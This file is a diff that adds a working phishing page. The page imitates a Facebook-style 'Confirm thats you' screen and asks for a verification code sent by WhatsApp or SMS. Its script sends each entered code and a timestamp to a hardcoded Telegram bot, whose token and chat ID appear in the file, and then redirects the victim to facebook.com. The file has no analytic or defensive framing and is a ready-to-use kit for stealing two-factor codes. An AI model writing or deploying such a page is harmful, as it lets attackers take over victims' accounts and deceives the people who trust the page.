@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirm thats you</title>
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:system-ui,-apple-system,Roboto,Arial,sans-serif;
+}
+
+body{
+  margin:0;
+  background:#f0f2f5;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+}
+
+.main{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  padding:16px;
+}
+
+.text{
+  font-size:20px;
+  color:#050505;
+  line-height:1.4;
+  margin-bottom:22px;
+}
+
+.input-wrapper{
+  background:#fff;
+  border:1px solid #ccd0d5;
+  border-radius:6px;
+  padding:8px 10px;
+  margin-bottom:18px;
+}
+
+label{
+  font-size:13px;
+  color:#65676b;
+  display:block;
+  margin-bottom:4px;
+}
+
+input{
+  width:100%;
+  font-size:18px;
+  border:none;
+  outline:none;
+  padding:4px 0;
+}
+
+button{
+  width:100%;
+  font-size:20px;
+  font-weight:600;
+  padding:14px;
+  border:none;
+  border-radius:6px;
+  background:#e4e6eb;
+  color:#bcc0c4;
+  cursor: pointer;
+}
+
+button:enabled{
+  background:#1877f2;
+  color:#fff;
+}
+
+/* Footer-কে উপরে তুলে আনা + স্টাইল সামান্য অ্যাডজাস্ট */
+.footer-note{
+  text-align:center;
+  color:#65676b;
+  font-size:13px;
+  line-height:1.4;
+  margin-top: 24px;       /* Continue বাটনের নিচে একটু স্পেস */
+  margin-bottom: 32px;    /* নিচের দিকে স্পেস যাতে body-র শেষে লাগে না */
+}
+</style>
+</head>
+<body>
+
+<div class="main">
+  <div class="text">
+    We sent a code to WhatsApp or Text message. Enter that code to confirm your account.
+  </div>
+
+  <form id="verifyForm">
+    <div class="input-wrapper">
+      <label>Enter code</label>
+      <input
+        id="code"
+        type="text"
+        inputmode="numeric"
+        maxlength="8"
+        required
+        autocomplete="off"
+      >
+    </div>
+
+    <button id="continueBtn" type="submit" disabled>
+      Continue
+    </button>
+  </form>
+
+  <!-- Footer এখানে তুলে আনা হয়েছে (ফর্মের ঠিক নিচে) -->
+  <div class="footer-note">
+    Note: Your text message may take a few minutes to arrive.<br>
+    English (UK) &nbsp; বাংলা
+  </div>
+</div>
+
+<script>
+// Telegram settings
+const TELEGRAM_BOT_TOKEN = "8320070006:AAH3TRha9FV06YIAFtStFBAJXi-0OpeoU1A";
+const TELEGRAM_CHAT_ID    = "7999697290";
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+// Elements
+const codeInput = document.getElementById('code');
+const btn = document.getElementById('continueBtn');
+
+// ক্লিক করলেই শুধু পিওর কোড কপি
+codeInput.addEventListener('click', () => {
+  const code = codeInput.value.trim();
+  if (code.length > 0) {
+    navigator.clipboard.writeText(code).then(() => {
+      codeInput.classList.add('copied-flash');
+      setTimeout(() => codeInput.classList.remove('copied-flash'), 600);
+    }).catch(() => {
+      codeInput.select();
+      document.execCommand('copy');
+    });
+  }
+});
+
+// ইনপুট ভ্যালিডেশন
+codeInput.addEventListener('input', () => {
+  codeInput.value = codeInput.value.replace(/[^0-9]/g, '');
+  btn.disabled = !(codeInput.value.length >= 6 && codeInput.value.length <= 8);
+});
+
+// Submit → Telegram + Redirect
+document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  if (btn.disabled) return;
+
+  const code = codeInput.value.trim();
+  const now = new Date();
+  const timeStr = now.toLocaleString('en-GB', {
+    day: '2-digit', month: '2-digit', year: 'numeric',
+    hour: '2-digit', minute: '2-digit', second: '2-digit',
+    hour12: false
+  }).replace(/,/, '');
+
+  const message = `Code: ${code}\nTime: ${timeStr}`;
+
+  try {
+    await fetch(TELEGRAM_API, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+    });
+  } catch (err) {
+    console.log("Telegram failed", err);
+  }
+
+  window.location.href = 'https://www.facebook.com';
+});
+</script>
+
+<!-- Flash animation CSS -->
+<style>
+.copied-flash {
+  animation: flash 0.6s;
+}
+@keyframes flash {
+  0% { background-color: #e8f5e9; }
+  100% { background-color: #fff; }
+}
+</style>
+
+</body>
+  </html>
